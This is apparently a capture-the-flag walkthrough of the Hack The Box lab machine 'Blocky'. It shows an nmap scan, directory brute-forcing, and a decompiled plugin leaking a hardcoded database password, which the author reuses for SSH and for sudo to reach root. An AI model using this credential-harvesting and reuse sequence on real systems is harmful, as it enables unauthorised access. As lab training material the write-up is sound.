# HTB - Blocky
## OS - Linux

I started with an nmap scan as usual. IP Address of Blocky: 10.10.10.37

```
$nmap -sC -sV -oN Blocky.nmap 10.10.10.37
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-09 12:06 PST
Nmap scan report for 10.10.10.37
Host is up (0.094s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp closed sophos
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.00 seconds
```

Ports 21, 22, and 80 are open. Internet search showed there are some interesting exploits in WordPress 4.8 that we might be able to use.

Ran dirbuster after that. There are a lot of results like "http://10.10.10.37/index.php/2017/07/02/welcome-to-blockycraft/".

It shows a post by user notch. http://10.10.10.37/wp-includes/ shows the php scripts loaded on the web site.
It shows http://10.10.10.37/wiki which says
```
Under Construction

Please check back later! We will start publishing wiki articles after we have finished the main server plugin!

The new core plugin will store your playtime and other information in our database, so you can see your own stats!
```
So I tried /plugin and /plugins.

http://10.10.10.37/plugins shows two jar files. I downloaded the jar files.

I am used to procyon java disassembler but for some reason, I could not build it on this machine. So I downloaded jd-gui as it was suggested as an alternative.

Using jd-gui, I browsed the two jar files - BlockyCore.jar and griefprevention.jar.

BlockyCore.jar once disassembled shows BlockyCore.class with the following contents:

```
package com.myfirstplugin;

public class BlockyCore {
  public String sqlHost = "localhost";
  
  public String sqlUser = "root";
  
  public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
  
  public void onServerStart() {}
  
  public void onServerStop() {}
  
  public void onPlayerJoin() {
    sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
  }
  
  public void sendMessage(String username, String message) {}
}
```

Tried to ssh into the box as root with the above password but it did not work.

The message "Welcome to the Blcokycraft" shows up with author notch on the webpage, so I tried to ssh as notch. This time it worked.

```
$ssh notch@10.10.10.37
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230
notch@Blocky:~$ ls
minecraft  user.txt
notch@Blocky:~$ cat user.txt 
```

Now to get privilege escalation, I tried "sudo -l". It asked for a passwd and I tried the above passwd. It worked.

```
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ sudo -i
root@Blocky:~# ls
root.txt
root@Blocky:~# cat root.txt 
```



